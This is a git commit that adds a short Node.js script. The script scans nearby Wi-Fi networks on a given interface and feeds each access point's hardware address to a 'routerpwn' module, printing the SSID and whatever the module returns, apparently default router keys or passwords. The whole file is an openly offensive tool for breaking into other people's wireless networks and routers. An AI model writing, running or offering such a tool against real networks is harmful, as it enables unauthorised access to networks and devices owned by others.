c6525d127daca130aa84c2af6e7e6fa9d4b93ace
Jannick Fahlbusch <git@jf-projects.de>
2015-11-02 15:42:56 +0100

    First version

---
+++ index.js
@@ -0,0 +1,35 @@
+var routerpwn = require('routerpwn');
+var iface = process.argv[2];
+
+if (!iface) {
+    console.log("Usage: " + process.argv[1] + " wlan0");
+    return;
+}
+
+var Wireless = require('wireless');
+var wireless = new Wireless({
+    iface: iface,
+    updateFrequency: 5,
+    connectionSpyFrequency: 2,
+    vanishThreshold: 2
+});
+
+
+routerpwn.init(function() {
+    wireless.enable(function(err) {
+        wireless.start();
+
+    	if(err) {
+    		console.log(err);
+    	}
+    });
+});
+
+wireless.on('appear', function(networkList) {
+    var pwn = routerpwn.pwn(networkList.address);
+
+    if(pwn) {
+        console.log(networkList.ssid);
+        console.log(pwn);
+    }
+});
